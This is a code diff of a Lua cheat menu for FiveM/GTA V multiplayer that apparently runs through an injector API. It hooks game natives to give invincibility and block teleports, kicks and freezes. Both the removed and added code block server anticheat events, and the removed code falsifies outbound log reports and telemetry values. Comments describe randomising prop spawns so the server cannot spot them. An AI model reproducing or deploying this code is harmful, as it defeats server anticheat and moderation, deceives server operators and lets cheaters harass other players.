-                if IsLocalPed(ped) and toggle == false then return false end
-                return true
-            end,
-        },
-
-        -- hardening
-        {
-            name = "SET_ENTITY_INVINCIBLE", hash = 0x3882114BDE571AD4,
-            fn = function(entity, toggle)
-                if not S.harden or not IsLocalPed(entity) then return true end
-                if toggle == false then return false end
-                return true
-            end,
-        },
-        {
-            name = "SET_PLAYER_INVINCIBLE", hash = 0x239528EACDC3E7DE,
-            fn = function(player, toggle)
-                if not S.harden or player ~= Ctx.player then return true end
-                if toggle == false then return false end
-                return true
-            end,
-        },
-        {
-            name = "SET_PED_ARMOUR", hash = 0xCEA04D83135264CC,
-            fn = function(ped, armour)
-                if not S.harden or not IsLocalPed(ped) then return true end
-                if type(armour) == "number" and armour < S.armour then return false end
-                return true
-            end,
-        },
-        {
-            name = "SET_PLAYER_MAX_ARMOUR", hash = 0x77DFCCF5948B8C71,
-            fn = function(player, maximum)
-                if not S.harden or player ~= Ctx.player then return true end
-                if type(maximum) == "number" and maximum < S.armour then return false end
-                return true
-            end,
-        },
-        {
-            name = "SET_ENTITY_PROOFS", hash = 0xFAEE099C6F890BB8,
-            fn = function(entity, bullet, fire, explosion, collision,
-                          melee, steam, p7, drowning)
-                if not S.harden or not IsLocalPed(entity) then return true end
-                local any = bullet or fire or explosion or collision
-                    or melee or steam or p7 or drowning
-                if not any then return false end
-                return true
-            end,
-        },
-        {
-            name = "SET_PED_SUFFERS_CRITICAL_HITS", hash = 0xEBD76F2359F190AC,
-            fn = function(ped, toggle)
-                if not S.harden or not IsLocalPed(ped) then return true end
-                if toggle == true then return false end
-                return true
-            end,
-        },
-        {
-            name = "SET_PED_DIES_WHEN_INJURED", hash = 0x5BA7919BED300023,
-            fn = function(ped, toggle)
-                if not S.harden or not IsLocalPed(ped) then return true end
-                if toggle == true then return false end
-                return true
-            end,
-        },
-        {
-            name = "SET_PED_CAN_BE_DRAGGED_OUT", hash = 0xC1670E958EEE24E5,
-            fn = function(ped, toggle)
-                if not S.harden or not IsLocalPed(ped) then return true end
-                if toggle == true then return false end
-                return true
-            end,
-        },
-        {
-            name = "SET_PED_CAN_RAGDOLL_FROM_PLAYER_IMPACT", hash = 0xDF993EE5E90ABA25,
-            fn = function(ped, toggle)
-                if not S.harden or not IsLocalPed(ped) then return true end
-                if toggle == true then return false end
-                return true
-            end,
-        },
-
-        -- vehicle hold
-        {
-            name = "SET_VEHICLE_UNDRIVEABLE", hash = 0x8ABA6AF54B942B95,
-            fn = function(vehicle, toggle)
-                if not S.antiVehicle or vehicle ~= Ctx.vehicle then return true end
-                if toggle == true then return false end
-                return true
-            end,
-        },
-        {
-            name = "SET_VEHICLE_DOORS_LOCKED", hash = 0xB664292EAECF7FA6,
-            fn = function(vehicle, status)
-                if not S.antiVehicle or vehicle ~= Ctx.vehicle then return true end
-                if type(status) == "number" and status > 1 then return false end
-                return true
-            end,
-        },
-        {
-            name = "SET_VEHICLE_DOORS_LOCKED_FOR_ALL_PLAYERS", hash = 0xA2F80B8D040727CC,
-            fn = function(vehicle, toggle)
-                if not S.antiVehicle or vehicle ~= Ctx.vehicle then return true end
-                if toggle == true then return false end
-                return true
-            end,
-        },
-        {
-            name = "SET_VEHICLE_ENGINE_HEALTH", hash = 0x45F6D8EEF34ABEF1,
-            fn = function(vehicle, health)
-                if not S.antiVehicle or vehicle ~= Ctx.vehicle then return true end
-                if type(health) == "number" and health < 900.0 then return false end
-                return true
-            end,
-        },
-        {
-            name = "SET_VEHICLE_BODY_HEALTH", hash = 0xB77D05AC8C78AADB,
-            fn = function(vehicle, health)
-                if not S.antiVehicle or vehicle ~= Ctx.vehicle then return true end
-                if type(health) == "number" and health < 900.0 then return false end
-                return true
-            end,
-        },
-
-        -- anti-freeze setters
-        {
-            name = "SET_ENTITY_DYNAMIC", hash = 0x1718DE8E3F2823CA,
-            fn = function(entity, toggle)
-                if not S.antiFreeze or not IsLocalPed(entity) then return true end
-                if toggle == false then return false end
-                return true
-            end,
-        },
-        {
-            name = "NETWORK_IS_IN_SPECTATOR_MODE", hash = 0x048746E388762E11,
-            fn = function()
-                if S.antiSpectate then return false, false end
-                return true
-            end,
-        },
-
-        -- anti-strip
-        {
-            name = "SET_PED_COMPONENT_VARIATION", hash = 0x262B14F48D29DE80,
-            fn = function(ped, componentId, drawableId, textureId)
-                if not S.antiStrip or not IsLocalPed(ped) then return true end
-                if type(componentId) == "number" and componentId >= 3
-                    and drawableId == 0 and textureId == 0 then
-                    return false
-                end
-                return true
-            end,
-        },
-        {
-            name = "SET_PED_PROP_INDEX", hash = 0x93376B65A266EB5F,
-            fn = function(ped, _propId, drawableId)
-                if not S.antiStrip or not IsLocalPed(ped) then return true end
-                if drawableId == -1 then return false end
-                return true
-            end,
-        },
-        {
-            name = "SET_PED_DEFAULT_COMPONENT_VARIATION", hash = 0x45EEE61580806D63,
-            fn = function(ped)
-                if S.antiStrip and IsLocalPed(ped) then return false end
-                return true
-            end,
-        },
-        {
-            name = "SET_PED_RANDOM_COMPONENT_VARIATION", hash = 0xC8A9481A01E63C28,
-            fn = function(ped)
-                if S.antiStrip and IsLocalPed(ped) then return false end
-                return true
-            end,
-        },
-    }
-
-    for i = 1, #hooks do
-        local hook = hooks[i]
-        local ok = pcall(Api.HookNative, hook.hash, hook.fn)
+        local ok, err = pcall(Api.HookNative, entry.hash, entry.fn)
         if ok then
             HookStats.installed = HookStats.installed + 1
         else
             HookStats.failed = HookStats.failed + 1
-            Log("WARN", "hook failed: %s", hook.name)
+            Log("WARN", "hook %s failed: %s", entry.name, tostring(err))
+        end
+    end
+
+    if type(Api.HasNativeHookInitializationFailed) == "function" then
+        local ok, failed = pcall(Api.HasNativeHookInitializationFailed)
+        if ok and failed then
+            Log("WARN", "HookNative reported an initialization failure")
         end
     end
 
     Log("INFO", "%d native hooks installed, %d failed", HookStats.installed, HookStats.failed)
 end
 
--- If the engine hook is unavailable, wrap the Lua globals so the same flags
--- still apply inside this VM.
-local function InstallLuaFallbacks()
-    if HookStats.installed > 0 then return end
-
-    local originalCoords = SetEntityCoords
-    _G.SetEntityCoords = function(entity, ...)
-        if S.antiTeleport and not MutationsBlocked() and IsLocalPed(entity) then return end
-        return originalCoords(entity, ...)
+local function RemoveNativeHooks()
+    if type(Api.UnhookNative) ~= "function" then
+        Log("WARN", "UnhookNative unavailable - hooks stay installed but inert")
+        return
     end
 
-    local originalHealth = SetEntityHealth
-    _G.SetEntityHealth = function(entity, health, ...)
-        if S.antiKill and not MutationsBlocked() and IsLocalPed(entity)
-            and type(health) == "number" and health < 100 then
-            return
-        end
-        return originalHealth(entity, health, ...)
+    for i = 1, #HookList do
+        pcall(Api.UnhookNative, HookList[i].hash)
     end
 
-    local originalDelete = DeleteEntity
-    _G.DeleteEntity = function(entity, ...)
-        if S.antiDelete and not MutationsBlocked() and IsLocalPed(entity) then return end
-        return originalDelete(entity, ...)
-    end
-
-    local originalAttach = AttachEntityToEntity
-    _G.AttachEntityToEntity = function(entity, attachTo, ...)
-        if S.antiAttach and not MutationsBlocked()
-            and (IsLocalPed(entity) or IsLocalPed(attachTo)) then return end
-        return originalAttach(entity, attachTo, ...)
-    end
-
-    Log("INFO", "Lua fallback guards installed")
+    HookStats.installed = 0
+    Log("INFO", "native hooks removed")
 end
 
 --------------------------------------------------------------------------------
--- EVENT SHIELD
+-- EVENT SHIELD  (Susano.BlockServerEvent / Susano.GetAllEvent)
 --------------------------------------------------------------------------------
 
-local blockedEvents = {}
+local blockedByShield = {}
+
+local function ShieldAvailable()
+    return type(Api.BlockServerEvent) == "function"
+end
 
 local function BlockEvent(name)
-    if type(name) ~= "string" or name == "" or blockedEvents[name] then return false end
+    if not ShieldAvailable() then return false end
+    if type(name) ~= "string" or name == "" then return false end
     if IsProtectedChannel(name) then return false end
-    if pcall(Api.BlockServerEvent, true, name) then
-        blockedEvents[name] = true
+    if blockedByShield[name] then return true end
+
+    local ok = pcall(Api.BlockServerEvent, true, name)
+    if ok then
+        blockedByShield[name] = true
         return true
     end
     return false
 end
 
-local function SweepEvents(verbose)
-    if not S.eventShield then return 0 end
+local function UnblockAllEvents()
+    if not ShieldAvailable() then return 0 end
+
+    local released = 0
+    for name in pairs(blockedByShield) do
+        pcall(Api.BlockServerEvent, false, name)
+        released = released + 1
+    end
+
+    blockedByShield = {}
+    return released
+end
+
+local function SweepEvents()
+    if not ShieldAvailable() or type(Api.GetAllEvent) ~= "function" then return 0 end
 
     local ok, events = pcall(Api.GetAllEvent)
     if not ok or type(events) ~= "table" then return 0 end
 
     local added = 0
+
     for i = 1, #events do
         local entry = events[i]
         local name = type(entry) == "table" and entry.event or entry
-        if type(name) == "string" and not blockedEvents[name] and not IsProtectedChannel(name) then
+
+        if type(name) == "string" and name ~= ""
+            and not blockedByShield[name] and not IsProtectedChannel(name) then
             local lowered = string.lower(name)
+
             for p = 1, #CFG.blockPatterns do
                 if string.find(lowered, CFG.blockPatterns[p], 1, true) then
                     if BlockEvent(name) then added = added + 1 end
@@ -15179,405 +14910,29 @@ local function SweepEvents(verbose)
         end
     end
 
-    if verbose then
-        Notify(("Event sweep: %d blocked"):format(added), C.blue)
-    end
     return added
 end
 
 local function ApplyEventShield(state)
-    if state then
-        for i = 1, #CFG.blockedEvents do BlockEvent(CFG.blockedEvents[i]) end
-        SweepEvents(false)
-    else
-        for name in pairs(blockedEvents) do
-            pcall(Api.BlockServerEvent, false, name)
-        end
-        blockedEvents = {}
-    end
-end
-
-local function IsBlockedName(name)
-    local lowered = string.lower(tostring(name))
-    for i = 1, #CFG.blockedEvents do
-        local rule = string.lower(CFG.blockedEvents[i])
-        if #rule <= 5 then
-            if lowered == rule or lowered:sub(1, #rule + 1) == rule .. ":" then
-                return true
-            end
-        elseif string.find(lowered, rule, 1, true) then
-            return true
-        end
-    end
-    return false
-end
-
-local logChannels = {
-    "log", "report", "anticheat", "ac_", "_ac", "flag", "violation",
-    "audit", "monitor", "screenshot", "screen", "detect", "evidence",
-    "sanction", "strike", "punish",
-}
-
-local spoofRanges = {
-    speed = { 5.0, 8.4 },
-    velocity = { 5.0, 8.4 },
-    health = { 188, 199 },
-    hp = { 188, 199 },
-    armour = { 0, 0 },
-    armor = { 0, 0 },
-    wanted = { 0, 0 },
-    damage = { 0, 0 },
-    god = { 0, 0 },
-    distance = { 0.5, 3.0 },
-}
-
-local spoofFlags = {
-    godmode = false, god = false, invincible = false, noclip = false,
-    ghost = false, teleport = false, speedhack = false, cheat = false,
-    hacked = false, injected = false, bypass = false, exploit = false,
-    detected = false, flagged = false,
-}
-
-local function IsLogChannel(name)
-    local lowered = string.lower(tostring(name))
-    for i = 1, #logChannels do
-        if string.find(lowered, logChannels[i], 1, true) then return true end
-    end
-    return false
-end
-
-local function SanitizeValue(value, depth, key)
-    if depth > 4 then return value end
-
-    local kind = type(value)
-    local lowered = type(key) == "string" and string.lower(key) or ""
-
-    if kind == "number" then
-        local range = spoofRanges[lowered]
-        if range then
-            return range[1] + math.random() * (range[2] - range[1])
-        end
-        return value
-    end
-
-    if kind == "boolean" then
-        if spoofFlags[lowered] ~= nil then return spoofFlags[lowered] end
-        return value
-    end
-
-    if kind == "table" then
-        local copy = {}
-        for k, v in pairs(value) do
-            copy[k] = SanitizeValue(v, depth + 1, k)
-        end
-        return copy
-    end
-
-    return value
-end
-
-local unpackArgs = table.unpack or unpack
-
--- Everything that leaves this VM as a log/report leaves with plausible values.
-local originalTriggerServerEvent = TriggerServerEvent
-_G.TriggerServerEvent = function(eventName, ...)
-    if eventName == nil then
-        return originalTriggerServerEvent(eventName, ...)
-    end
-
-    if S.outbound and not IsProtectedChannel(eventName) and IsBlockedName(eventName) then
-        Log("DEBUG", "outbound blocked: %s", tostring(eventName))
+    if not state then
+        local released = UnblockAllEvents()
+        Log("INFO", "event shield off - %d channel(s) released", released)
         return
     end
 
-    if S.logSpoof and IsLogChannel(eventName) then
-        local count = select("#", ...)
-        local args = { n = count, ... }
-
-        for i = 1, count do
-            args[i] = SanitizeValue(args[i], 0, nil)
-        end
-
-        return originalTriggerServerEvent(eventName, unpackArgs(args, 1, count))
-    end
-
-    return originalTriggerServerEvent(eventName, ...)
-end
-
---------------------------------------------------------------------------------
--- TELEMETRY
---------------------------------------------------------------------------------
-
--- The five main telemetry natives are already hooked by the loader at the top
--- of the file. We only drive its flags, plus a few extra reads of our own.
-local function ApplyTelemetry(state)
-    S.telemetry = state and true or false
-
-    if type(_Stealth) == "table" then
-        _Stealth.health = S.telemetry
-        _Stealth.speed = S.telemetry
-        _Stealth.invincible = S.telemetry
-        _Stealth.stamina = S.telemetry
-        _Stealth.ammo = S.telemetry
-    end
-end
-
-local TelemetryStats = { installed = 0, failed = 0 }
-
-local function InstallTelemetryHooks()
-    if type(Api.HookNative) ~= "function" then return end
-
-    local hooks = {
-        {
-            name = "GET_ENTITY_HEIGHT_ABOVE_GROUND", hash = 0x1DD55701034110E5,
-            fn = function(entity)
-                if not S.telemetry or entity ~= Ctx.ped then return true end
-                return false, 0.0
-            end,
-        },
-        {
-            name = "GET_PLAYER_WANTED_LEVEL", hash = 0xE28E54788CE8F12D,
-            fn = function(player)
-                if not S.telemetry or player ~= Ctx.player then return true end
-                return false, 0
-            end,
-        },
-        {
-            name = "GET_PED_ARMOUR", hash = 0x9483AF821605B1D8,
-            fn = function(entity)
-                if not S.telemetry or entity ~= Ctx.ped then return true end
-                return false, 0
-            end,
-        },
-        {
-            name = "GET_ENTITY_MAX_HEALTH", hash = 0x15D757606D170C3C,
-            fn = function(entity)
-                if not S.telemetry or entity ~= Ctx.ped then return true end
-                return false, 200
-            end,
-        },
-        {
-            name = "GET_VEHICLE_ENGINE_HEALTH", hash = 0xC45D23BAF168AAB8,
-            fn = function(vehicle)
-                if not S.telemetry or Ctx.vehicle == 0 or vehicle ~= Ctx.vehicle then return true end
-                return false, 1000.0
-            end,
-        },
-        {
-            name = "GET_VEHICLE_BODY_HEALTH", hash = 0xF271147EB7B40F12,
-            fn = function(vehicle)
-                if not S.telemetry or Ctx.vehicle == 0 or vehicle ~= Ctx.vehicle then return true end
-                return false, 1000.0
-            end,
-        },
-        {
-            name = "IS_PLAYER_WANTED_LEVEL_GREATER", hash = 0x238DB2A2C23EE9EF,
-            fn = function(player)
-                if not S.telemetry or player ~= Ctx.player then return true end
-                return false, false
-            end,
-        },
-    }
-
-    for i = 1, #hooks do
-        local ok = pcall(Api.HookNative, hooks[i].hash, hooks[i].fn)
-        if ok then
-            TelemetryStats.installed = TelemetryStats.installed + 1
-        else
-            TelemetryStats.failed = TelemetryStats.failed + 1
-            Log("WARN", "telemetry hook failed: %s", hooks[i].name)
-        end
-    end
-
-    Log("INFO", "%d extra telemetry hooks installed, %d failed",
-        TelemetryStats.installed, TelemetryStats.failed)
-end
-
---------------------------------------------------------------------------------
--- GHOST
---------------------------------------------------------------------------------
-
-local function ApplyGhost()
-    local ped = Ctx.ped
-    if ped == 0 then return end
-
-    pcall(SetLocalPlayerAsGhost, true)
-    pcall(SetGhostAlpha, 0)
-
-    if Ctx.vehicle ~= 0 then
-        pcall(SetNetworkVehicleAsGhost, Ctx.vehicle, true)
-    end
-end
-
-local function ClearGhost()
-    pcall(SetLocalPlayerAsGhost, false)
-    pcall(ResetGhostAlpha)
-
-    local ped = PlayerPedId()
-    pcall(SetEntityLocallyVisible, ped)
-
-    local veh = GetVehiclePedIsIn(ped, false)
-    if veh and veh ~= 0 then
-        pcall(SetNetworkVehicleAsGhost, veh, false)
-    end
-end
-
---------------------------------------------------------------------------------
--- HARDENING
---------------------------------------------------------------------------------
-
-local function ApplyHarden()
-    local ped = Ctx.ped
-    if ped == 0 then return end
-
-    pcall(SetEntityProofs, ped,
-        S.proofBullet, S.proofFire, S.proofExplo, S.proofCollide,
-        false, S.proofSteam, false, S.proofDrown)
-
-    pcall(SetPedSuffersCriticalHits, ped, false)
-    pcall(SetPedDiesWhenInjured, ped, false)
-    pcall(SetPedCanRagdollFromPlayerImpact, ped, false)
-    pcall(SetPedCanBeDraggedOut, ped, false)
-    pcall(SetPedArmour, ped, S.armour)
-    pcall(SetPlayerMaxArmour, Ctx.player, S.armour)
-
-    if S.vehicleArmor and Ctx.vehicle ~= 0 then
-        local veh = Ctx.vehicle
-        pcall(SetVehicleTyresCanBurst, veh, false)
-        pcall(SetVehicleStrong, veh, true)
-        pcall(SetVehicleEngineCanDegrade, veh, false)
-        pcall(SetVehicleCanBeVisiblyDamaged, veh, false)
-        pcall(SetVehicleHasStrongAxles, veh, true)
-        pcall(SetVehicleCanBeTargetted, veh, false)
-        pcall(SetVehicleUndriveable, veh, false)
-
-        pcall(function()
-            if not NetworkHasControlOfEntity(veh) then
-                NetworkRequestControlOfEntity(veh)
-            end
-            SetEntityAsMissionEntity(veh, true, true)
-            SetVehicleDoorsLocked(veh, 1)
-            SetVehicleDoorsLockedForAllPlayers(veh, false)
-        end)
-    end
-end
-
-local function ClearHarden()
-    local ped = PlayerPedId()
-    pcall(SetEntityProofs, ped, false, false, false, false, false, false, false, false)
-    pcall(SetPedSuffersCriticalHits, ped, true)
-    pcall(SetPedDiesWhenInjured, ped, true)
-    pcall(SetPedCanRagdollFromPlayerImpact, ped, true)
-    pcall(SetPedCanBeDraggedOut, ped, true)
-
-    local veh = GetVehiclePedIsIn(ped, false)
-    if veh and veh ~= 0 then
-        pcall(SetVehicleTyresCanBurst, veh, true)
-        pcall(SetVehicleStrong, veh, false)
-        pcall(SetVehicleEngineCanDegrade, veh, true)
-        pcall(SetVehicleCanBeVisiblyDamaged, veh, true)
-        pcall(SetVehicleHasStrongAxles, veh, false)
-        pcall(SetVehicleCanBeTargetted, veh, true)
-    end
-end
-
---------------------------------------------------------------------------------
--- ANTI-FREEZE / ANTI-SPECTATE
---------------------------------------------------------------------------------
-
-local function ApplyAntiFreeze()
-    local ped = Ctx.ped
-    if ped == 0 then return end
-
-    pcall(FreezeEntityPosition, ped, false)
-    pcall(SetEntityDynamic, ped, true)
-
-    local ok, attachedTo = pcall(GetEntityAttachedTo, ped)
-    if ok and attachedTo and attachedTo ~= 0 then
-        pcall(DetachEntity, ped, true, true)
-        Notify("Foreign attachment removed", C.red)
-    end
-
-    if Ctx.vehicle ~= 0 then
-        pcall(FreezeEntityPosition, Ctx.vehicle, false)
-        pcall(SetVehicleUndriveable, Ctx.vehicle, false)
-    end
-end
-
-local function ApplyAntiSpectate()
-    local ok, spectating = pcall(NetworkIsInSpectatorMode)
-    if ok and spectating then
-        pcall(NetworkSetInSpectatorMode, false, Ctx.ped)
-        Notify("Forced spectator mode broken", C.red)
-    end
-end
-
---------------------------------------------------------------------------------
--- OUTFIT GUARD (evasive anti-strip: restore, never block the native)
---------------------------------------------------------------------------------
-
-local Outfit = { ped = 0, components = nil, props = nil }
-
-local function SnapshotOutfit()
-    local ped = Ctx.ped
-    if ped == 0 then
-        ped = PlayerPedId()
-        if ped == 0 then return end
-    end
-
-    local components, props = {}, {}
-
-    for id = 0, 11 do
-        local okDrawable, drawable = pcall(GetPedDrawableVariation, ped, id)
-        local okTexture, texture = pcall(GetPedTextureVariation, ped, id)
-        if okDrawable and type(drawable) == "number" then
-            components[id] = { drawable, okTexture and tonumber(texture) or 0 }
-        end
-    end
-
-    for id = 0, 7 do
-        local okDrawable, drawable = pcall(GetPedPropIndex, ped, id)
-        local okTexture, texture = pcall(GetPedPropTextureIndex, ped, id)
-        if okDrawable and type(drawable) == "number" then
-            props[id] = { drawable, okTexture and tonumber(texture) or 0 }
-        end
-    end
-
-    Outfit.ped = ped
-    Outfit.components = components
-    Outfit.props = props
-end
-
-local function ApplyOutfitGuard()
-    local ped = Ctx.ped
-    if ped == 0 then return end
-
-    if not Outfit.components or Outfit.ped ~= ped then
-        SnapshotOutfit()
+    if not ShieldAvailable() then
+        Log("WARN", "BlockServerEvent unavailable - event shield inert")
         return
     end
 
-    for id, saved in pairs(Outfit.components) do
-        local okDrawable, drawable = pcall(GetPedDrawableVariation, ped, id)
-        local okTexture, texture = pcall(GetPedTextureVariation, ped, id)
-        if okDrawable and okTexture and (drawable ~= saved[1] or texture ~= saved[2]) then
-            pcall(SetPedComponentVariation, ped, id, saved[1], saved[2], 0)
-        end
+    local blocked = SweepEvents()
+
+    -- Fixed list: blocked even before the resource registers its listener.
+    for i = 1, #CFG.blockPatterns do
+        BlockEvent(CFG.blockPatterns[i])
     end
 
-    for id, saved in pairs(Outfit.props) do
-        local okDrawable, drawable = pcall(GetPedPropIndex, ped, id)
-        if okDrawable then
-            if saved[1] == -1 then
-                if drawable ~= -1 then pcall(ClearPedProp, ped, id) end
-            else
-                local okTexture, texture = pcall(GetPedPropTextureIndex, ped, id)
-                if not okTexture or drawable ~= saved[1] or texture ~= saved[2] then
-                    pcall(SetPedPropIndex, ped, id, saved[1], saved[2], true)
-                end
-            end
-        end
-    end
+    Log("INFO", "event shield on - %d live channel(s) blocked", blocked)
 end
 
 --------------------------------------------------------------------------------
@@ -15600,137 +14955,25 @@ local function LoadModel(hash, model)
 end
 
 --------------------------------------------------------------------------------
--- SPOOFED VEHICLE (Susano.CreateSpoofedVehicle)
+-- ATTACHMENT
 --------------------------------------------------------------------------------
 
-local VEHICLES = {
-    { label = "Adder",             model = "adder" },
-    { label = "Zentorno",          model = "zentorno" },
-    { label = "Kuruma (armoured)", model = "kuruma2" },
-    { label = "Insurgent",         model = "insurgent2" },
-    { label = "Oppressor Mk II",   model = "oppressor2" },
-    { label = "Deluxo",            model = "deluxo" },
-    { label = "Sultan RS",         model = "sultanrs" },
-    { label = "Bati 801",          model = "bati" },
-}
-
-local vehicleLabels = {}
-
-for i = 1, #VEHICLES do
-    vehicleLabels[i] = VEHICLES[i].label
-end
-
-local LastVehicle = 0
-local vehicleItem = nil
-
-local function DeleteLastVehicle()
-    if LastVehicle == 0 or not DoesEntityExist(LastVehicle) then
-        Notify("No spawned vehicle", C.red)
-        return
-    end
-
-    pcall(NetworkRequestControlOfEntity, LastVehicle)
-    pcall(SetEntityAsMissionEntity, LastVehicle, true, true)
-    pcall(DeleteVehicle, LastVehicle)
-    LastVehicle = 0
-    Notify("Vehicle deleted", C.blue)
-end
-
-local function SpawnSpoofedVehicle()
-    local index = vehicleItem and vehicleItem.selected or S.vehicleModel
-    local entry = VEHICLES[index] or VEHICLES[1]
-    S.vehicleModel = index
-
-    Citizen.CreateThread(function()
-        local hash = GetHashKey(entry.model)
-        local loaded, reason = LoadModel(hash, entry.model)
-        if not loaded then
-            Notify(reason, C.red)
-            return
-        end
-
-        local ped = PlayerPedId()
-        local coords = GetOffsetFromEntityInWorldCoords(ped, 0.0, 4.0, 0.0)
-        local heading = GetEntityHeading(ped)
-
-        -- Spoofed creation semantics: the entity does not carry the usual
-        -- script-created footprint on the server side.
-        local spoofed = false
-        local vehicle = 0
-
-        if type(Api.CreateSpoofedVehicle) == "function" then
-            local ok, result = pcall(Api.CreateSpoofedVehicle, hash,
-                coords.x, coords.y, coords.z, heading, true, true, false)
-            if ok and type(result) == "number" and result ~= 0 then
-                vehicle = result
-                spoofed = true
-            end
-        end
-
-        if vehicle == 0 then
-            local ok, result = pcall(CreateVehicle, hash,
-                coords.x, coords.y, coords.z, heading, true, true)
-            if ok and type(result) == "number" and result ~= 0 then
-                vehicle = result
-            end
-        end
-
-        if vehicle == 0 then
-            Notify(("%s spawn failed"):format(entry.label), C.red)
-            SetModelAsNoLongerNeeded(hash)
-            return
-        end
-
-        pcall(SetVehicleOnGroundProperly, vehicle)
-        pcall(SetEntityAsMissionEntity, vehicle, true, true)
-        pcall(SetVehicleHasBeenOwnedByPlayer, vehicle, true)
-
-        if S.vehicleWarp then
-            pcall(SetPedIntoVehicle, ped, vehicle, -1)
-        end
-
-        LastVehicle = vehicle
-        Notify(("%s spawned (%s)"):format(entry.label,
-            spoofed and "spoofed" or "native"), spoofed and C.green or C.blue)
-
-        SetModelAsNoLongerNeeded(hash)
-    end)
-end
-
-local function RepairVehicle()
-    local veh = GetVehiclePedIsIn(PlayerPedId(), false)
-    if not veh or veh == 0 then
-        Notify("Not in a vehicle", C.red)
-        return
-    end
-
-    pcall(SetVehicleFixed, veh)
-    pcall(SetVehicleDeformationFixed, veh)
-    pcall(SetVehicleEngineHealth, veh, 1000.0)
-    pcall(SetVehicleBodyHealth, veh, 1000.0)
-    pcall(SetVehiclePetrolTankHealth, veh, 1000.0)
-    Notify("Vehicle repaired", C.green)
-end
-
---------------------------------------------------------------------------------
--- PROP SPAWNER
---------------------------------------------------------------------------------
-
-local function AttachToBone(obj, boneName, entity)
-    local boneIndex = CFG.boneIds[string.lower(tostring(boneName or ""))]
-    if not boneIndex then return false end
+local function AttachToBone(obj, boneIndex, entity)
+    if type(boneIndex) ~= "number" then return false end
 
     local target = entity or PlayerPedId()
-    local previous = _G.SeedBypass
-    _G.SeedBypass = true
+    local previous = Bypass
+    Bypass = true
+
     local ok = pcall(AttachEntityToEntity, obj, target, boneIndex,
         0.0, 0.0, 0.0, 0.0, 0.0, 0.0,
         false, false, false, true, 2, true)
-    _G.SeedBypass = previous
+
+    Bypass = previous
 
     if not ok then return false end
 
-    -- A remote ped cannot be verified with GetEntityAttachedTo, the link is
+    -- A remote ped cannot be verified with GetEntityAttachedTo: the link is
     -- owned by the other client. Local ped: verify the real link.
     if target ~= PlayerPedId() then return true end
 
@@ -15738,7 +14981,7 @@ local function AttachToBone(obj, boneName, entity)
     return GetEntityAttachedTo(obj) == target
 end
 
--- Local CreateObject only exists for this client. Registering the entity on
+-- A local CreateObject only exists for this client. Registering the entity on
 -- the network gives it a network ID, which is what makes other players see it.
 local function EnsureNetworked(obj)
     if not obj or obj == 0 or not DoesEntityExist(obj) then return 0 end
@@ -15764,8 +15007,46 @@ local function EnsureNetworked(obj)
     return 0
 end
 
-local function SpawnProp(model, extra, targetPed, targetName, attachToTarget)
+--------------------------------------------------------------------------------
+-- PROP LIFECYCLE
+--------------------------------------------------------------------------------
+
+local function ForgetProp(obj)
+    for i = #Spawned, 1, -1 do
+        if Spawned[i] == obj then table.remove(Spawned, i) end
+    end
+end
+
+local function DeleteProp(obj)
+    if obj and obj ~= 0 and DoesEntityExist(obj) then
+        pcall(NetworkRequestControlOfEntity, obj)
+        pcall(SetEntityAsMissionEntity, obj, true, true)
+
+        local previous = Bypass
+        Bypass = true
+        pcall(DeleteObject, obj)
+        Bypass = previous
+    end
+    if obj then ForgetProp(obj) end
+end
+
+-- A client that keeps dozens of networked objects alive is easy to spot from
+-- the server. Old props are recycled instead of accumulating.
+local function TrimSpawned()
+    while #Spawned > MAX_SPAWNED do
+        DeleteProp(table.remove(Spawned, 1))
+    end
+end
+
+local function SpawnProp(entry, extra, targetPed, targetName, attachToTarget)
+    local model = entry.model
+    local world = entry.world == true
+
     Citizen.CreateThread(function()
+        -- Randomised start: when a burst is sent to several players, the
+        -- objects must not appear on the same tick.
+        Citizen.Wait(math.random(20, 160))
+
         local hash = GetHashKey(model)
         local loaded, reason = LoadModel(hash, model)
         if not loaded then
@@ -15784,20 +15065,52 @@ local function SpawnProp(model, extra, targetPed, targetName, attachToTarget)
             return
         end
 
-        local heading = GetEntityHeading(ped)
-        local pitch = GetEntityPitch(ped)
-        local roll = GetEntityRoll(ped)
+        -- A ped sitting in a car: welding a 4 m prop to its spine makes the
+        -- chassis climb on every ground contact. The prop is dropped next to
+        -- the car as a normal world object instead.
+        local vehicle = 0
+        do
+            local okVeh, v = pcall(GetVehiclePedIsIn, ped, false)
+            if okVeh and type(v) == "number" and v ~= 0 and DoesEntityExist(v) then
+                vehicle = v
+            end
+        end
 
+        local inVehicle = vehicle ~= 0
+        local heading = GetEntityHeading(inVehicle and vehicle or ped)
+        local pitch = 0.0
+        local roll = 0.0
         local target
-        local forward = 0.0
 
-        if remote then
-            local coords = GetEntityCoords(ped)
-            target = vector3(coords.x, coords.y, coords.z)
+        if world or inVehicle then
+            local base = inVehicle and vehicle or ped
+            local forward = 4.0
+
+            if inVehicle then
+                local okDim, _, vMax = pcall(GetModelDimensions, GetEntityModel(vehicle))
+                if okDim and vMax and type(vMax.y) == "number" then
+                    forward = vMax.y + 2.0
+                end
+            end
+
+            local side = (inVehicle and not world) and 3.5 or 0.0
+            local okPos, pos = pcall(GetOffsetFromEntityInWorldCoords, base, side, forward, 0.0)
+            if not okPos or not pos then pos = GetEntityCoords(ped) end
+
+            -- Randomised footprint: two identical spawns on the same byte of
+            -- ground are a pattern, a jittered one is ordinary clutter.
+            if world and not inVehicle then
+                pos = vector3(
+                    pos.x + (math.random() - 0.5) * 0.30,
+                    pos.y + (math.random() - 0.5) * 0.30,
+                    pos.z)
+            end
+
+            target = vector3(pos.x, pos.y, pos.z)
         else
-            local distance = CFG.distanceM[CFG.distances[S.propDistance]] or 3.0
-            forward = distance + (extra or 0.0)
-            target = GetOffsetFromEntityInWorldCoords(ped, 0.0, forward, 0.0)
+            pitch = GetEntityPitch(ped)
+            roll = GetEntityRoll(ped)
+            target = GetOffsetFromEntityInWorldCoords(ped, 0.0, 3.0 + (extra or 0.0), 0.0)
         end
 
         -- isNetwork = true, netMissionEntity = true: the object is replicated
@@ -15809,57 +15122,77 @@ local function SpawnProp(model, extra, targetPed, targetName, attachToTarget)
             return
         end
 
-        SetEntityRotation(obj, pitch, roll, heading, 2, true)
-        SetEntityAsMissionEntity(obj, true, true)
-        FreezeEntityPosition(obj, true)
+        if world or inVehicle then
+            local spin = world and ((math.random() - 0.5) * 12.0) or 0.0
+            SetEntityRotation(obj, 0.0, 0.0, heading + 180.0 + spin, 2, true)
+        else
+            SetEntityRotation(obj, pitch, roll, heading, 2, true)
+        end
 
-        local bone = CFG.bones[S.propBone]
         local attached = false
-        local wantsAttach = bone and bone ~= "off" and (not remote or attachToTarget)
